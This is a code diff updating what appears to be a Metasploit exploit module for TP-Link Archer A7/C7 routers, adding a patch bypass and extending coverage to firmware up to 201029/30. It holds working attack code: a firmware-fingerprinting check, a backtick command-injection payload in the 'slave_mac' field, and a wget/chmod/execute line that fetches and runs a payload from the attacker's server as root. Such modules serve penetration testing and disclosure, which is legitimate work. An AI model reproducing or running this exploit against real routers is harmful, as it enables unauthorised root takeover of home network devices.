@@ -26,6 +26,9 @@ def initialize(info = {})
           as root, including downloading and executing a binary from another host.
           This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +
           Radek Domanski).
+          This module was updated in November 2020, after a bypass was discovered for the patch TP-Link issued. The new
+          injection technique works on older firmware too. All firmware versions up to (but excluding) releases 201029 and
+          201030 are exploitable.
         },
         'License' => MSF_LICENSE,
         'Author' =>
@@ -38,9 +41,12 @@ def initialize(info = {})
             [ 'URL', 'https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo'],
             [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md'],
             [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md'],
+            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md'],
+            [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md'],
             [ 'CVE', '2020-10882'],
             [ 'CVE', '2020-10883'],
             [ 'CVE', '2020-10884'],
+            [ 'CVE', '2020-28347'],
             [ 'ZDI', '20-334'],
             [ 'ZDI', '20-335'],
             [ 'ZDI', '20-336' ]
@@ -57,7 +63,7 @@ def initialize(info = {})
           },
         'Targets' =>
           [
-            [ 'TP-Link Archer A7/C7 (AC1750) v5 (firmware 190726)', {} ]
+            [ 'TP-Link Archer A7/C7 (AC1750) v5 (firmware up to 201029/30)', {} ]
           ],
         'DisclosureDate' => '2020-03-25',
         'DefaultTarget' => 0
@@ -77,15 +83,41 @@ def initialize(info = {})
   end
 
   def check
+    vuln_versions = [
+      # older versions not listed here are also vulnerable
+      "app.1575358240615.manifest",   # A7 191203
+      "app.1582117229115.manifest",   # A7 200220
+      "app.1595301495454.manifest",   # A7 200721
+      "app.1564127413977.manifest",   # C7 190726
+      "app.1593336984117.manifest",   # C7 201030
+    ]
+
+    fixed_versions = [
+      "app.1603185012713.manifest",   # A7 201029
+      "app.1603240096315.manifest"    # C7 201030
+    ]
+
     begin
-      res = send_request_cgi({
-        'uri' => '/webpages/app.1564127413977.manifest',
-        'method' => 'GET',
-        'rport' => 80
-      })
-
-      if res && res.code == 200
-        return Exploit::CheckCode::Vulnerable
+      for version in vuln_versions
+        res = send_request_cgi({
+          'uri' => "/webpages/#{version}",
+          'method' => 'GET',
+          'rport' => 80
+        })
+        if res && res.code == 200
+          return Exploit::CheckCode::Vulnerable
+        end
+      end
+
+      for version in fixed_versions
+        res = send_request_cgi({
+          'uri' => "/webpages/#{version}",
+          'method' => 'GET',
+          'rport' => 80
+        })
+        if res && res.code == 200
+          return Exploit::CheckCode::Safe
+        end
       end
     rescue ::Rex::ConnectionError
       pass
@@ -223,15 +255,19 @@ def aes_encrypt(plaintext)
     encrypted
   end
 
-  def create_injection(c)
+  def create_injection(c, literal = false)
     # Template for the command injection
     # The injection happens at "slave_mac" (read advisory for details)
     # The payload will have to be padded to exactly 16 bytes to ensure reliability between different OpenSSL versions.
 
     # This will fail if we send a command with single quotes (')
     # ... but that's not a problem for this module, since we don't use them for our command.
     # It might also fail with double quotes (") since this will break the JSON...
-    inject = "\';printf \'#{c}\'>>#{@cmd_file}\'"
+    if literal
+      inject = c
+    else
+      inject = "\'`printf \'#{c}\'>>#{@cmd_file}`\'"
+    end
 
     template = '{"method":"slave_key_offer","data":{'\
     "\"group_id\":\"#{rand_text_numeric(1..3)}\","\
@@ -270,8 +306,8 @@ def update_len_field(packet, payload_length)
   def exec_cmd_file(packet)
     # This function handles special action of exec
     # Returns new complete tpdp packet
-    inject = "\';sh #{@cmd_file}\'"
-    payload = create_injection(inject)
+    inject = "\'`sh #{@cmd_file}`\'"
+    payload = create_injection(inject, true)
 
     ciphertext = aes_encrypt(payload)
     if !ciphertext
@@ -287,10 +323,12 @@ def exec_cmd_file(packet)
 
   # Handle incoming requests from the router
   def on_request_uri(cli, _request)
-    print_good("#{peer} - Sending executable to the router")
-    print_good("#{peer} - Sit back and relax, Shelly will come visit soon!")
-    send_response(cli, @payload_exe)
-    @payload_sent = true
+    if not @payload_sent
+      print_good("#{peer} - Sending executable to the router")
+      print_good("#{peer} - Sit back and relax, Shelly will come visit soon!")
+      send_response(cli, @payload_exe)
+      @payload_sent = true
+    end
   end
 
   def exploit
@@ -317,20 +355,21 @@ def exploit
     srv_host = datastore['SRVHOST']
     srv_port = datastore['SRVPORT']
     @cmd_file = rand_text_alpha_lower(1)
+    payload_file = rand_text_alpha_lower(1)
 
     # generate our payload executable
     @payload_exe = generate_payload_exe
 
     # Command that will download @payload_exe and execute it
-    download_cmd = "wget http://#{srv_host}:#{srv_port}/#{@cmd_file};chmod +x #{@cmd_file};./#{@cmd_file}"
+    download_cmd = "wget http://#{srv_host}:#{srv_port}/#{payload_file};chmod +x #{payload_file};./#{payload_file}"
 
     http_service = 'http://' + srv_host + ':' + srv_port.to_s
     print_status("Starting up our web service on #{http_service} ...")
     start_service({ 'Uri' => {
       'Proc' => proc do |cli, req|
         on_request_uri(cli, req)
       end,
-      'Path' => "/#{@cmd_file}"
+      'Path' => "/#{payload_file}"
     } })
 
     print_status("#{peer} - Connecting to the target")